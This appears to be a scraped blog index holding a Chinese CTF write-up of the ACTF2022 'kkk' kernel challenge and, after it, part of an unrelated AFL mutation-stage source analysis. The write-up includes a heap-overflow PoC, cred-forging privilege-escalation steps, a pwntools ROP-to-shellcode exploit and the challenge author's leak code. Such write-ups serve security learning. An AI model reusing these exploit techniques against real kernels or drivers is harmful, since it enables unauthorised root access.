obj-\u003ekeypack.ptr 的前八个字节作为 key 去进行加密 obj-\u003edatapack.ptr ，会调用函数 enc_dec_internal ，其中 size 由 obj-\u003edatapack.size 指定。可以看到它的操作是按 blocksize 去逐块加密，但我们注意到它并没有进行对齐操作。 static void enc_dec_internal(struct crypto_cipher *tfm, char *buf, size_t size, char *block1, char *block2, size_t blocksize, int enc) { int i; for (i = 0; i \u003c size; i += blocksize) { memcpy(block1, buf + i, blocksize); /* code */ if (enc) { crypto_cipher_encrypt_one(tfm, block2, block1); } else { crypto_cipher_decrypt_one(tfm, block2, block1); } memcpy(buf + i, block2, blocksize); } } 漏洞就出现在这里。 kkk_aes256_cb 和 kkk_aes128_cb 中，这两个加密函数指定的 blocksize 均为 16，但是由于 obj-\u003edatapack.size 并没有做 16 字节对齐操作，将可能导致内核堆溢出。kkk_des_cb 与 kkk_tdes_cb 也同理，它也没有保证其 8 字节对齐。 ","date":"2022-07-17","objectID":"/2022/07/actf2022-kkk/:3:2","tags":null,"title":"ACTF2022 kkk 赛后复现","uri":"/2022/07/actf2022-kkk/"},{"categories":["PWN"],"content":"测试 尝试修改 kernel 启动的 init 脚本，对 kkk.ko 单独进行测试。将 /parser 启动命令改成 /bin/sh 即可。 #!/bin/sh mkdir tmp mount -t proc none /proc mount -t sysfs none /sys mount -t devtmpfs devtmpfs /dev mount -t tmpfs none /tmp exec 0\u003c/dev/console exec 1\u003e/dev/console exec 2\u003e/dev/console echo -e \"Boot took $(cut -d' ' -f1 /proc/uptime)seconds\" insmod /kkk.ko chmod 666 /dev/kkk chmod 740 /flag echo 1 \u003e /proc/sys/kernel/kptr_restrict echo 1 \u003e /proc/sys/kernel/dmesg_restrict chmod 400 /proc/kallsyms poweroff -d 600 -f \u0026 # setsid /bin/cttyhack setuidgid 1000 /parser setsid /bin/cttyhack setuidgid 1000 /bin/sh umount /proc umount /sys umount /tmp poweroff -d 0 -f 堆溢出 PoC 如下，将它静态编译放入文件系统即可。 #include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e#include \u003csys/ioctl.h\u003e#include \u003cstring.h\u003e#include \u003csys/types.h\u003e#include \u003csys/stat.h\u003e#include \u003cfcntl.h\u003e struct AddParam{ unsigned long long type; // type and enc unsigned long long key_len; char * key; unsigned long long data_len; char * data; }; struct OtherParam{ unsigned long long id; unsigned long long key_len; char * key; unsigned long long data_len; char * data; }; void Add(int fd, struct AddParam* p) { printf(\"[+] Add return :%d\\n\", ioctl(fd, 0x6B64, p)); } void Run(int fd, struct OtherParam* p) { printf(\"[+] Launch return :%d\\n\", ioctl(fd, 0x6B6B, p)); } void Detach(int fd, struct OtherParam* p) { ioctl(fd, 0x6B6D, p); } void main() { char path[0x10] = \"/dev/kkk\"; char buf[0x100]; memset(buf, 0, 0x100); int fd = open(path, 0); if(fd == -1){ puts(\"[!] open wrong, exit\"); exit(0); } struct AddParam a; struct OtherParam r; // malloc 192 - 48 = 144 = 0x90 a.type = 3; a.key_len = 0x7F; a.key = buf; a.data_len = 0x11; a.data = buf + 0x80; memset(buf, 0x41, 8); Add(fd, \u0026a); a.type = 3; a.key_len = 0x80; a.key = buf; a.data_len = 0x10; a.data = buf + 0x80; memset(buf, 0x42, 8); Add(fd, \u0026a); // memset(buf, 0x43, 8); // Add(fd, \u0026a); r.id = 0; Run(fd, \u0026r); return; } // 0xffff98df82d7ccc0 // 0xffff98df82d7cd80 当 add 分配时，会调用 kmalloc(obj-\u003edatapack.size + obj-\u003ekeypack.size + 48)，我们将它分配的堆块全部控制在 kmalloc-192 这个 SLUB 中，并使它们地址连续（如果不连续就多分配几个，直到连续）。这个 PoC 的逻辑是：让 SLUB 分配两个地址连续的 kmalloc-192 堆块，其 id 分别是 0 和 1，通过 Run() 触发对 id=0 的堆块的 kkk_aes256_cb 加密。通过加密前，堆块内容如下 通过加密后，由于对齐原因造成堆溢出，覆盖了相邻下方 id=1 堆块的 keypack.size 与 keypack.ptr 区域。 ","date":"2022-07-17","objectID":"/2022/07/actf2022-kkk/:3:3","tags":null,"title":"ACTF2022 kkk 赛后复现","uri":"/2022/07/actf2022-kkk/"},{"categories":["PWN"],"content":"利用 堆溢出之后我们可以修改 keypack.size 与 keypack.ptr 区域，配合 update 与 dump 功能，实际上就可以做到内核区域任意地址读写。但堆上只有 SLUB 地址和 kkk.ko 的地址，内核代码段地址不得而知。很自然想到的一个方式是：修改 fork 出来的子进程的 cred 结构体。 fork \u0026 zero cred SLUB 分配规则比较简单，这里只需要注意三点： cred 结构体大小进的是 kmalloc-192 这个 SLUB 不同大小的 SLUB 分配地址相差十万八千里 由于 kmalloc-192 的初始分配情况未知，可能出现分配时一个 partial 链用完了换了另一个等情况，导致连续分配的两个 SLUB 地址也不相邻，所以得多调一下避免这种情况的发生。 所以我们的思路就是让一个 kmalloc-192 溢出，覆盖后一个 kmalloc-192 的域，再利用程序逻辑越界写在后面跟着的 cred 结构体的 kmalloc-192，清零 uid 位拿到 root 权限。本来应该是可以的，但我做到一半突然意识到忘了 sandbox 这回事了。。因为这题不能直接打内核，还是得从 parser 开始打，拿不到 shell 导致还是得在 parser 程序中用 sandbox 允许的系统调用来提权，sandbox 里不让 fork … 又想到 tty 结构体，如果能在 SLUB 中分配一个 tty 结构体就好了，说不定里面由一些内核代码段的地址。但是 open(\"/dev/ptmx\") 总是返回 errno=2 ，这个文件明明是有的，但是 cat 提示 No such file or directory。查了一下好像是 kernel 启动脚本的问题，靶机上也没法改启动脚本啊…遂作罢。 有一篇文章总结了一下常用的结构体，但是日文翻译之后我都看不太懂…找到了相似的另一份中文资料，也没找到适合大小的结构体。 爆破内核代码段地址 其实拿到内核代码段地址就好办了，当我们拿到 commit_creds 地址之后只需要把堆上的加密函数指针覆盖成 commit_creds 就行，并且在堆上伪造一个 init_creds，触发加密逻辑即可拿到 root 权限，然后 orw 读 flag。这是 Nu1L 战队题解的思路。 虽然内核代码段只有 12 个 bits 在改变，但是这题开了 kaslr 吧…exp 地址正确的概率不是只有 1/2^12 吗 … 但是怎么泄露内核地址呢? 越界读只能泄露kkk.ko的地址, 也没法ROP, 想了很久, 最终解决⽅法是: 爆破. 因为内核基地址的熵很⼩, 只有24bit, ⽽且实测发现⼤多数情况都是0x1F800000, 0x21100000这样⽐较⼩的数字, 因此爆破花不了多⻓时间的. 感觉概率也挺低吧… Nu1L 的师傅说爆了一个多小时。 泄露内核代码段地址 拿到内核代码段地址还有另一种办法。我们现在通过覆盖 keypack.size 可以进行越界读写，篡改后一个堆块的大小和指针域就能实现真正意义上的任意地址读写。我们可以很轻易的拿到 SLUB 地址和 kkk.ko 的加载地址（越界读拿到 handler 函数地址）现在的问题就是能不能在 SLUB 段或是 kkk.ko 段找到一个有 kernel 段代码地址的地方呢？ 实际上是有的，由于 kkk.ko 的 fops 没有都被驱动实现（实现了就在 kkk.ko，没实现就用 kernel 原本的），所以在 fops 中可以找到 kernel 地址。X1cT34m 战队 与出题人大哥泄露 kernel 地址的思路都是如此。 / # cat /proc/kallsyms | grep kkk ffffffffc0000000 t kkk_write [kkk] ffffffffc0000010 t enc_dec_internal [kkk] ffffffffc0000130 t kkk_aes256_cb [kkk] ffffffffc0000290 t kkk_aes128_cb [kkk] ffffffffc00003d0 t kkk_tdes_cb [kkk] ffffffffc0000510 t kkk_des_cb [kkk] ffffffffc0000620 t kkk_close [kkk] ffffffffc0000670 t kkk_open [kkk] ffffffffc00006b0 t kkk_read [kkk] ffffffffc00006c0 t kkk_unlocked_ioctl [kkk] ffffffffc00009f0 t kkk_compat_ioctl [kkk] ffffffffc00009f5 t kkk_exit [kkk] ffffffffc0001180 r kkk_fops [kkk] # !!! ffffffffc000109f r .LC12 [kkk] ffffffffc0001694 r _note_9 [kkk] ffffffffc00016ac r _note_8 [kkk] ffffffffc00020c0 d __this_module [kkk] ffffffffc00009f5 t cleanup_module [kkk] ffffffffc0002060 d handlers [kkk] ffffffffc0002000 d kkk_device [kkk] pwndbg\u003e x/10xg 0xffffffffc0001180 0xffffffffc0001180: 0xffffffffc00020c0 0xffffffff812258e0 0xffffffffc0001190: 0xffffffffc00006b0 0xffffffffc0000000 0xffffffffc00011a0: 0x0000000000000000 0x0000000000000000 0xffffffffc00011b0: 0x0000000000000000 0x0000000000000000 0xffffffffc00011c0: 0x0000000000000000 0x0000000000000000 privilege escalation 拿到 kernel 地址就好办啦，这里我们也有三种方法 Nu1L: 修改加密 handler 为 commit_creds ，在当前块伪造一个 init_cred ，触发加密即可。无需跳回用户态。 X1cT34m \u0026 AAA（出题人大哥）：找 gadget 把栈迁移到 SLUB 上做 ROP，做完需要圆润地返回用户态。 影二つ的博客：通过 init_task 结构体，遍历全部的 task_struct，找到当前进程的 cred ，清零 PID 便能拿到 root 权限。无需跳回用户态。 当然，找到当前 task_struct 之后，也可以直接把 cred 结构体指针改成 init_cred。 笔者一开始复现时采用了第一种方法，因为它看上去是最自然的。init_cred 有这些结构，一般来说它被赋予的值见这篇文章. /* * The initial credentials for the initial task */ struct cred init_cred = { .usage = ATOMIC_INIT(4), #ifdef CONFIG_DEBUG_CREDENTIALS .subscribers = ATOMIC_INIT(2), .magic = CRED_MAGIC, #endif .uid = GLOBAL_ROOT_UID, .gid = GLOBAL_ROOT_GID, .suid = GLOBAL_ROOT_UID, .sgid = GLOBAL_ROOT_GID, .euid = GLOBAL_ROOT_UID, .egid = GLOBAL_ROOT_GID, .fsuid = GLOBAL_ROOT_UID, .fsgid = GLOBAL_ROOT_GID, .securebits = SECUREBITS_DEFAULT, .cap_inheritable = CAP_EMPTY_SET, .cap_permitted = CAP_FULL_SET, .cap_effective = CAP_FULL_SET, .cap_bset = CAP_FULL_SET, .user = INIT_USER, .user_ns = \u0026init_user_ns, .group_info = \u0026init_groups, }; 看上去只要 .usage = 4，其他的全 0 就完事了。但实际上并不是。经过测试在 ptr[15] 处需要填充一处可读写的地址（填 SLUB 地址就行），这样就可以成功执行 commit_creds 拿到 root 权限。Nu1L 题解这样就行，但是我复现的时候发现后续 open(\"/flag\") 再次 syscall read 的时候会出现段错误，错误现场能推测出是 cred 结构体伪造有误。最后经过反复尝试发现 ptr[17] 处需要和 init_cred 该处的值保持一致，这个值在 kernel 的某个数据段，和 kernel 代码段偏移貌似是有概率不变的。 ptr[0] = 4; ptr[1] = 0; ptr[2] = 0; ptr[3] = 0; ptr[4] = 0; ptr[5] = ","date":"2022-07-17","objectID":"/2022/07/actf2022-kkk/:3:4","tags":null,"title":"ACTF2022 kkk 赛后复现","uri":"/2022/07/actf2022-kkk/"},{"categories":["PWN"],"content":"step 3 最后一步，我们将两个 exp 合起来。首先拿到 exloit.c 的 shellcode，如果确实都改成 inline 汇编的话，直接这样编译就行。 gcc exploit.c -o exploit -pie -O2 -fno-stack-protector 提取出代码段，于是便得到了纯机器码的利用脚本。在打穿 parser 的脚本中读入这段 shellcode 即可完成利用。 objcopy -O binary --only-section=.text exploit exp.o 最后需要注意一点，shellcode 不能直接 read 进来，需要利用 parser 里的 read_through_base64 函数读 base64 进去。 直接发了不可见字符给 qemu 会被吞字节的，因为相当于发信号过去了。 最终 exp 如下，以不小的概率打通。 import base64 import sys import base64 sys.path.append('/home/x1do0/.local/lib/python3.8/site-packages') sys.path.append('/home/x1do0/.local/lib/python3.8/site-packages/unicornafl-1.0.3-py3.8.egg') print(sys.path) from pwn import * context(arch = 'amd64', os = 'linux', endian = 'little') context.log_level = 'debug' context.terminal = ['tmux', 'splitw', '-h', '-p', '75'] def SEND(io, con): io.send(base64.b64encode(con)) # io = process(\"./parser\") io = process([\"qemu-system-x86_64\", \"-m\", \"1024M\", \"-kernel\", \"bzImage\", \"-initrd\", \"rootfs.img\", \"-monitor\", \"/dev/null\", \"-append\", \"root=/dev/ram console=ttyS0 oops=panic panic=1 kpti=1 quiet\", \"-cpu\", \"kvm64,+smep,+smap\", \"-smp\", \"cores=2,threads=2\", \"-nographic\", \"-enable-kvm\"]) # input() # gdb.attach(io, \"b *0x401B22\") for i in range(15): io.sendafter(\"ENTER YOUR PACKET \u003e \", '\\n') io.recvuntil(\"ENTER YOUR PACKET \u003e \") ### pakcet_hdr 0 - 0x30 packet_hdr = p32(0xAAA) + p32(1) packet_hdr += p64(0) packet_hdr += p32(0x877) # a1[4] packet_hdr += p32(0x796f15c9) # crc32 packet_hdr = packet_hdr.ljust(0x30, b'\\x00') SEND(io, packet_hdr) ### segment_hdr 0x30 - 0x38 cnt = 1 segment_hdr = p32(cnt) + p32(0) # a1[:30] SEND(io, segment_hdr) ### segment 0x38 - ### header 8 bytes size = 0xf0000000 segment = p32(0) + p32(size) SEND(io, segment) ### content size bytes # 0x00000000004006a6 : pop rdi ; ret # 0x000000000045c139 : pop rdx ; pop rsi ; ret # 0x00000000004005af : pop rax ; ret # 0x00000000004859c5 : syscall ; ret # mprotect(buf, 0x1000, 4|2|1) buf_addr = 0x6D4000 rop = flat(0x00000000004006a6, buf_addr, 0x000000000045c139, 7, 0x1000, 0x00000000004005af, 10, 0x00000000004859c5) # read(0, buf, 0x100) # rop += flat(0x00000000004006a6, 0, # 0x000000000045c139, 0x100, buf_addr, # 0x00000000004005af, 0, # 0x00000000004859c5) shellcode = asm(shellcraft.open(\"/flag\")) shellcode += asm(shellcraft.read('rax', buf_addr+0x200, 0x20)) shellcode += asm(shellcraft.write(1, buf_addr+0x200, 0x20)) with open(\"exp.o\", 'rb') as f: shellcode = f.read() rop += flat(0x00000000004006a6, buf_addr, 0x402a3c, len(shellcode)+1, 0x401ABB) # ret2shellcode rop += p64(buf_addr) content = b'a'*0x848 + rop SEND(io, content) io.sendline() io.sendline(base64.b64encode(shellcode)) # 0x7ffdbdb52b80 # return at 0x7ffdbdb533c8 io.interactive() ","date":"2022-07-17","objectID":"/2022/07/actf2022-kkk/:4:0","tags":null,"title":"ACTF2022 kkk 赛后复现","uri":"/2022/07/actf2022-kkk/"},{"categories":["PWN"],"content":"Conclusion 至此，这题就算是做完了。最终的脚本成功概率不是特别高，但如果用户态 ROP 时加几个 ret slide 的话概率能显著提高（可能是错觉…）。一开始脸比较黑总是打不通，还以为 host 和 guest 偏移不一样…但这是静态编译啊，当时就觉得很迷。不过最后能确认的一点就是：host 与 guest 偏移没区别。虽然 Nu1L 那边的师傅也觉得痛苦，但我想我的痛苦完全源于自己太弱。。（脸黑也是弱的一个表现 :/ 最后再贴一下出题人大哥忘记传上官方题解的 exploit.c // this POC demonstrates the oob ability #include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e#include \u003cstring.h\u003e#include \u003cstdint.h\u003e #include \u003csys/types.h\u003e#include \u003csys/ioctl.h\u003e#include \u003csys/stat.h\u003e#include \u003cfcntl.h\u003e #include \u003cerrno.h\u003e#include \u003cunistd.h\u003e#include \u003ctime.h\u003e /* ioctl commands */ #define KKK_IOCTL_ADD _IO('k', 100) #define KKK_IOCTL_UPDATE _IO('k', 103) #define KKK_IOCTL_DUMP _IO('k', 105) #define KKK_IOCTL_LAUNCH _IO('k', 107) #define KKK_IOCTL_DETACH _IO('k', 109) #define MAX_OBJECT_NUM (16) enum kkk_type { KKK_CRYPTO_DES, KKK_CRYPTO_3DES, KKK_CRYPTO_AES128, KKK_CRYPTO_AES256, KKK_CRYPTO_NUM }; /* core data strcutres */ struct kkk_pack { unsigned int size; void *ptr; // user space pointer }; struct kkk_obj { struct kkk_pack keypack; struct kkk_pack datapack; int id; int enc; int (*handler)(struct kkk_obj *); }; struct kkk_ioctl_add_arg { enum kkk_type type; int enc; struct kkk_pack key; struct kkk_pack data; }; // we are sorry to introduce this structure // only now we can use one indirect call to pivot the stack to heap struct kkk_ioctl_other_arg { int id; struct kkk_pack key; struct kkk_pack data; }; void privileged_function() { int uid = getuid(); printf(\"uid: %d\\n\", uid); int fd = open(\"/flag\", O_RDONLY); char buf[128] = {0}; read(fd, buf, 128); puts(buf); } uint64_t user_cs, user_ss, user_rflags, user_sp; uint64_t user_rip = (uint64_t)privileged_function; void save_state() { __asm__(\".intel_syntax noprefix;\" \"mov user_cs, cs;\" \"mov user_ss, ss;\" \"mov user_sp, rsp;\" \"pushf;\" \"pop user_rflags;\" \".att_syntax\"); } int main(int argc, char *argv[]) { struct kkk_ioctl_add_arg add_arg = {0}; struct kkk_ioctl_other_arg other_arg = {0}; // ============ LEAK ============ // 1 - open int fd = open(\"/dev/kkk\", O_RDWR); int i, r; if (fd \u003c 0) { perror(\"open\"); exit(1); } // 2 - add two adjacent objects unsigned char key[450] = {0}; unsigned char data[14] = {0}; // bruteforce result here // # prefix b'\\xee)\\xa4\\xbd\\x9a.' support value 1022 memcpy(data + 8, \"\\xee)\\xa4\\xbd\\x9a.\", 14); add_arg.type = KKK_CRYPTO_DES; add_arg.enc = 1; add_arg.key.ptr = key; add_arg.key.size = 450; add_arg.data.ptr = data; add_arg.data.size = 14; // 2 bytes misaligan :) r = ioctl(fd, KKK_IOCTL_ADD, \u0026add_arg); if (r \u003c 0) { perror(\"KKK_IOCTL_ADD\"); goto leave; } r = ioctl(fd, KKK_IOCTL_ADD, \u0026add_arg); if (r \u003c 0) { perror(\"KKK_IOCTL_ADD\"); goto leave; } r = ioctl(fd, KKK_IOCTL_ADD, \u0026add_arg); if (r \u003c 0) { perror(\"KKK_IOCTL_ADD\"); goto leave; } // make the kernel stack bigger enough r = ioctl(fd, KKK_IOCTL_ADD, \u0026add_arg); if (r \u003c 0) { perror(\"KKK_IOCTL_ADD\"); goto leave; } // then we try to overflow with launch int id = 0; other_arg.id = id; r = ioctl(fd, KKK_IOCTL_LAUNCH, \u0026other_arg); if (r \u003c 0) { perror(\"KKK_IOCTL_LAUNCH\"); goto leave; } // the id'1 keysize will now be extremely large // dump it id = 1; unsigned char keybuf[65535] = {0}; unsigned char databuf[30] = {0}; other_arg.id = id; other_arg.key.ptr = keybuf; other_arg.data.ptr = data; r = ioctl(fd, KKK_IOCTL_DUMP, \u0026other_arg); if (r \u003c 0) { perror(\"KKK_IOCTL_DUMP\"); goto leave; } // since keylength is 450 // data is 14 struct kkk_obj *obj = keybuf + 450 + 14; printf(\"leaked:\\n\"); printf(\"key heap address: 0x%lx\\n\", obj-\u003ekeypack.ptr); printf(\"data heap address: 0x%lx\\n\", obj-\u003edatapack.ptr); printf(\"handler adddress: 0x%lx\\n\", obj-\u003ehandler); unsigned long module_kaslroffset = obj-\u003ehandler - 0xffffffffc0000510ul; printf(\"module kaslr offset: 0x%lx\\n\", module_kaslroffset); unsigned long module_load_address = 0xffffffffc0000000ul + module_kaslroffset; printf(\"module loaded at: 0x%lx\\n\", module_load_address); unsigned long kkk_fops_address = 0xffffffffc0001180ul + module_kaslroffset; unsigned long kkk_fops_size = 16; // 16 is enough // we hence exploit third chunks key","date":"2022-07-17","objectID":"/2022/07/actf2022-kkk/:5:0","tags":null,"title":"ACTF2022 kkk 赛后复现","uri":"/2022/07/actf2022-kkk/"},{"categories":["General"],"content":"本文将细致阐述 AFL 变异方式，包括各阶段的变异算子与次数等细节。变异模式是固定的，所以变异细节看上去繁琐又无趣。但正如白皮书中提到，“它被认为是一个被实践证实有效的 hack 行为集合，把这些行为以最简单、最健壮的形式实现便得到了 AFL”，经验主义的产物是不可小觑的。 前文提到在 fuzz_one 中会对测试用例进行如下阶段的变异： simple bitflip（+ dictionary construction） arithmetic inc/dec interesting values dictionary stuff random havoc splicing 接下来我们来详细描述一下各个过程。 ","date":"2022-01-28","objectID":"/2022/01/afl-rsc4/:0:0","tags":null,"title":"AFL 源码分析（完）变异详解","uri":"/2022/01/afl-rsc4/"},{"categories":["General"],"content":"simple bitflip 每个翻转的原子操作都是 FLIP_BIT(out_buf, stage_cur); ，其中 out_buf 为输出缓冲区，存放结果；stage_cur 是循环变量，从 0 自增到特定长度。 #define FLIP_BIT(_ar, _b) do { \\ u8* _arf = (u8*)(_ar); \\ u32 _bf = (_b); \\ _arf[(_bf) \u003e\u003e 3] ^= (128 \u003e\u003e ((_bf) \u0026 7)); \\ } while (0) 此部分有以下几个阶段 ","date":"2022-01-28","objectID":"/2022/01/afl-rsc4/:1:0","tags":null,"title":"AFL 源码分析（完）变异详解","uri":"/2022/01/afl-rsc4/"},{"categories":["General"],"content":"bitflip 1/1 从头到尾，步长为 1 bit，每次翻转 1 bit for (stage_cur = 0; stage_cur \u003c stage_max; stage_cur++) { stage_cur_byte = stage_cur \u003e\u003e 3; FLIP_BIT(out_buf, stage_cur); // 翻一位 if (common_fuzz_stuff(argv, out_buf, len)) goto abandon_entry; // 执行看看效果 FLIP_BIT(out_buf, stage_cur); // 复原 // ... // token 处理 } 这个阶段比较特殊的是 token 处理。每第八次翻转并执行之后（即翻转每个 byte 的最低有效位之后），都会检查 trace_bits 的改变情况。如果 checksum 和最初没翻转之前的不一样，但是连续几个 byte 翻转以后得到的 checksum 却相同，则将这个字节加入字典。 如白皮书所说，以此来改善 magic number 等固定结构的 fuzz 表现。如果遇到 magic number，对它的每个字节改变都会使程序走向崩溃路径，表现相同且与原路径不同。 “对于一些文件来说，我们已知其格式中出现的 token 长度不会超过 4，那么我们就可以修改MAX_AUTO_EXTRA 为 4 并重新编译 AFL，以排除一些明显不会是 token 的情况。遗憾的是，这些设置是通过宏定义来实现，所以不能做到运行时指定，每次修改后必须重新编译 AFL。” http://rk700.github.io/2018/01/04/afl-mutations/ ","date":"2022-01-28","objectID":"/2022/01/afl-rsc4/:1:1","tags":null,"title":"AFL 源码分析（完）变异详解","uri":"/2022/01/afl-rsc4/"},{"categories":["General"],"content":"bitflip 2/1 从头到尾，步长为 1 bit，每次翻转相邻的 2 bit for (stage_cur = 0; stage_cur \u003c stage_max; stage_cur++) { stage_cur_byte = stage_cur \u003e\u003e 3; FLIP_BIT(out_buf, stage_cur); FLIP_BIT(out_buf, stage_cur + 1); if (common_fuzz_stuff(argv, out_buf, len)) goto abandon_entry; FLIP_BIT(out_buf, stage_cur); // 复原 FLIP_BIT(out_buf, stage_cur + 1); } ","date":"2022-01-28","objectID":"/2022/01/afl-rsc4/:1:2","tags":null,"title":"AFL 源码分析（完）变异详解","uri":"/2022/01/afl-rsc4/"},{"categories":["General"],"content":"bitflip 4/1 从头到尾，步长为 1 bit，每次翻转相邻的 4 bit for (stage_cur = 0; stage_cur \u003c stage_max; stage_cur++) { stage_cur_byte = stage_cur \u003e\u003e 3; FLIP_BIT(out_buf, stage_cur); FLIP_BIT(out_buf, stage_cur + 1); FLIP_BIT(out_buf, stage_cur + 2); FLIP_BIT(out_buf, stage_cur + 3); if (common_fuzz_stuff(argv, out_buf, len)) goto abandon_entry; FLIP_BIT(out_buf, stage_cur); FLIP_BIT(out_buf, stage_cur + 1); FLIP_BIT(out_buf, stage_cur + 2); FLIP_BIT(out_buf, stage_cur + 3); } ","date":"2022-01-28","objectID":"/2022/01/afl-rsc4/:1:3","tags":null,"title":"AFL 源码分析（完）变异详解","uri":"/2022/01/afl-rsc4/"},{"categories":["General"],"content":"bitflip 8/8 这一阶段首先会创建 eff_map 空间，长度为测试用例字节数，并将头尾置 1，其余为 0. #define EFF_APOS(_p) ((_p) \u003e\u003e EFF_MAP_SCALE2) #define EFF_REM(_x) ((_x) \u0026 ((1 \u003c\u003c EFF_MAP_SCALE2) - 1)) #define EFF_ALEN(_l) (EFF_APOS(_l) + !!EFF_REM(_l)) #define EFF_SPAN_ALEN(_p, _l) (EFF_APOS((_p) + (_l) - 1) - EFF_APOS(_p) + 1) /* Initialize effector map for the next step (see comments below). Always flag first and last byte as doing something. */ eff_map = ck_alloc(EFF_ALEN(len)); eff_map[0] = 1; if (EFF_APOS(len - 1) != 0) { eff_map[EFF_APOS(len - 1)] = 1; eff_cnt++; } 从头到尾，步长为 1 byte，每次翻转 1 byte for (stage_cur = 0; stage_cur \u003c stage_max; stage_cur++) { stage_cur_byte = stage_cur; out_buf[stage_cur] ^= 0xFF; // 翻转整个 byte if (common_fuzz_stuff(argv, out_buf, len)) goto abandon_entry; // ... // effector map 处理 out_buf[stage_cur] ^= 0xFF; // 复原 } 翻转后检查 eff_map ，如果此字节对应项为 0 ，则检查翻转以后是否带来了路径变化，是则置 1. 当整个 byte 的改变都没有带来任何路径变化时， AFL 认为这个 byte 是没有价值的，后续会根据 eff_map 来选择性跳过。白皮书指出，这样的字节可能只是单纯的非元数据。 当然，AFL 做了一点例外处理。 /* Minimum input file length at which the effector logic kicks in: */ #define EFF_MIN_LEN 128 /* Maximum effector density past which everything is just fuzzed unconditionally (%): */ #define EFF_MAX_PERC 90 “ 默认情况下，如果文件小于 128 bytes，那么所有字符都是“有效”的；同样地，如果 AFL 发现一个文件有超过 90% 的 bytes 都是“有效”的，那么也不差那 10% 了，大笔一挥，干脆把所有字符都划归为“有效”。” 至此以后的翻转操作，均会参考 eff_map ，没有意义的 byte 会直接跳过操作。 ","date":"2022-01-28","objectID":"/2022/01/afl-rsc4/:1:4","tags":null,"title":"AFL 源码分析（完）变异详解","uri":"/2022/01/afl-rsc4/"},{"categories":["General"],"content":"bitflip 16/8 从头到尾，步长为 1 byte，每次翻转相邻的 2 byte for (i = 0; i \u003c len - 1; i++) { /* Let's consult the effector map... */ // 两个字节都没意义，不用翻了 if (!eff_map[EFF_APOS(i)] \u0026\u0026 !eff_map[EFF_APOS(i + 1)]) { stage_max--; continue; } stage_cur_byte = i; *(u16*)(out_buf + i) ^= 0xFFFF; if (common_fuzz_stuff(argv, out_buf, len)) goto abandon_entry; stage_cur++; *(u16*)(out_buf + i) ^= 0xFFFF; } ","date":"2022-01-28","objectID":"/2022/01/afl-rsc4/:1:5","tags":null,"title":"AFL 源码分析（完）变异详解","uri":"/2022/01/afl-rsc4/"},{"categories":["General"],"content":"bitflip 32/8 从头到尾，步长为 1 byte，每次翻转相邻的 4 byte for (i = 0; i \u003c len - 3; i++) { /* Let's consult the effector map... */ if (!eff_map[EFF_APOS(i)] \u0026\u0026 !eff_map[EFF_APOS(i + 1)] \u0026\u0026 !eff_map[EFF_APOS(i + 2)] \u0026\u0026 !eff_map[EFF_APOS(i + 3)]) { stage_max--; continue; } stage_cur_byte = i; *(u32*)(out_buf + i) ^= 0xFFFFFFFF; if (common_fuzz_stuff(argv, out_buf, len)) goto abandon_entry; stage_cur++; *(u32*)(out_buf + i) ^= 0xFFFFFFFF; } ","date":"2022-01-28","objectID":"/2022/01/afl-rsc4/:1:6","tags":null,"title":"AFL 源码分析（完）变异详解","uri":"/2022/01/afl-rsc4/"},{"categories":["General"],"content":"arithmetic inc/dec 这一阶段对测试用例做加减法变异。config.h 中将宏 ARITH_MAX 定义为 35，代表了算术运算范围为 -35 到 +35. 其中用 could_be_bitflip 来检查是否此步骤会产生和 bitflip 一样的结果（这是可以用位比较做到的），以减少重复执行。同时， eff_map 也指导了此步骤。 ","date":"2022-01-28","objectID":"/2022/01/afl-rsc4/:2:0","tags":null,"title":"AFL 源码分析（完）变异详解","uri":"/2022/01/afl-rsc4/"},{"categories":["General"],"content":"arith 8/8 从头到尾，步长为 1 byte，对每个字节都从 -35 一直试到 +35. for (i = 0; i \u003c len; i++) { u8 orig = out_buf[i]; /* Let's consult the effector map... */ if (!eff_map[EFF_APOS(i)]) { stage_max -= 2 * ARITH_MAX; continue; } stage_cur_byte = i; for (j = 1; j \u003c= ARITH_MAX; j++) { u8 r = orig ^ (orig + j); /* Do arithmetic operations only if the result couldn't be a product of a bitflip. */ if (!could_be_bitflip(r)) { stage_cur_val = j; out_buf[i] = orig + j; if (common_fuzz_stuff(argv, out_buf, len)) goto abandon_entry; stage_cur++; } else stage_max--; r = orig ^ (orig - j); if (!could_be_bitflip(r)) { stage_cur_val = -j; out_buf[i] = orig - j; if (common_fuzz_stuff(argv, out_buf, len)) goto abandon_entry; stage_cur++; } else stage_max--; out_buf[i] = orig; } ","date":"2022-01-28","objectID":"/2022/01/afl-rsc4/:2:1","tags":null,"title":"AFL 源码分析（完）变异详解","uri":"/2022/01/afl-rsc4/"},{"categories":["General"],"content":"arith 16/8 从头到尾，步长为 1 byte，对每个 word 都从 -35 一直试到 +35. 这里 AFL 考虑了大小端两种情况。 ","date":"2022-01-28","objectID":"/2022/01/afl-rsc4/:2:2","tags":null,"title":"AFL 源码分析（完）变异详解","uri":"/2022/01/afl-rsc4/"},{"categories":["General"],"content":"arith 32/8 从头到尾，步长为 1 byte，对每个 dword 都从 -35 一直试到 +35. 同样考虑了大小端。 ","date":"2022-01-28","objectID":"/2022/01/afl-rsc4/:2:3","tags":null,"title":"AFL 源码分析（完）变异详解","uri":"/2022/01/afl-rsc4/"},{"categories":["General"],"content":"interesting values 这一阶段用一些特殊的常数对测试用例做替换操作。config.h 中定义了这些 interesting values. static s8 interesting_8[] = { INTERESTING_8 }; static s16 interesting_16[] = { INTERESTING_8, INTERESTING_16 }; static s32 interesting_32[] = { INTERESTING_8, INTERESTING_16, INTERESTING_32 }; /* List of interesting values to use in fuzzing. */ #define INTERESTING_8 \\ -128, /* Overflow signed 8-bit when decremented */\\ -1, /* */\\ 0, /* */\\ 1, /* */\\ 16, /* One-off with common buffer size */\\ 32, /* One-off with common buffer size */\\ 64, /* One-off with common buffer size */\\ 100, /* One-off with common buffer size */\\ 127 /* Overflow signed 8-bit when incremented */#define INTERESTING_16 \\ -32768, /* Overflow signed 16-bit when decremented */\\ -129, /* Overflow signed 8-bit */\\ 128, /* Overflow signed 8-bit */\\ 255, /* Overflow unsig 8-bit when incremented */\\ 256, /* Overflow unsig 8-bit */\\ 512, /* One-off with common buffer size */\\ 1000, /* One-off with common buffer size */\\ 1024, /* One-off with common buffer size */\\ 4096, /* One-off with common buffer size */\\ 32767 /* Overflow signed 16-bit when incremented */#define INTERESTING_32 \\ -2147483648LL, /* Overflow signed 32-bit when decremented */\\ -100663046, /* Large negative number (endian-agnostic) */\\ -32769, /* Overflow signed 